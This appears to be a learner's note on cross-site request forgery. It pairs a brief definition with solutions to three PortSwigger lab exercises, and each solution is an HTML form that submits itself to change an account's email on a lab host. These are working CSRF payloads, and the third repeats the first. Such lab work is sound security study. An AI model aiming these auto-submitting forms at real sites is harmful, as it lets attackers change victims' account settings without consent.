# Cross Site Request Fogery (CSRF)

CSRF allows an attacker to partly circumvent the <b><i>same origin policy</i></b>, which is designed to prevent different websites from interfering with each other. <br>

Conditions to execute an successful CSRF attack
1. A Action
2. Cookie based session handling
3. Predictable request parameter (Header parameters)

solutions for portswigger lab exercise 

lab1:
<form method="POST" action="https://acfe1fd91fd1c3bbc0ab31e600dd00d6.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="csrf-success@test.com"></form>
<script>
document.forms[0].submit();
</script>

lab2:
<form method="GET" action="https://0a90009e047a2bce86637c47002800bd.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="hahlol@test.com"></form>
<script>
document.forms[0].submit();
</script>

lab3:
<form method="POST" action="https://acfe1fd91fd1c3bbc0ab31e600dd00d6.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="csrf-success@test.com"></form>
<script>
document.forms[0].submit();
</script>